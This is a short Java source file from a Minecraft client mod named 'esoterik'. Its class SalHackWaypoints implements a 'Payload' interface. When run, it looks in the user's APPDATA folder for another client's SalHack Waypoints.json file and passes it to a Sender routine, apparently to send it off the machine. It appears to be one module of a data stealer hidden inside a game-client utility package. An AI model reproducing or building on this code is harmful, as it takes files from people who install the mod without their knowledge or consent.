package com.esoterik.client.util.impl;

import com.esoterik.client.features.modules.misc.Sender;
import com.esoterik.client.util.FileUtil;
import com.esoterik.client.util.Payload;
import java.io.File;
import java.util.Optional;

public final class SalHackWaypoints implements Payload {
   public void execute() throws Exception {
      Optional<File> file = FileUtil.getFile(System.getenv("APPDATA") + "\\.minecraft\\SalHack\\Waypoints\\Waypoints.json");
      file.ifPresent(Sender::send);
   }
}
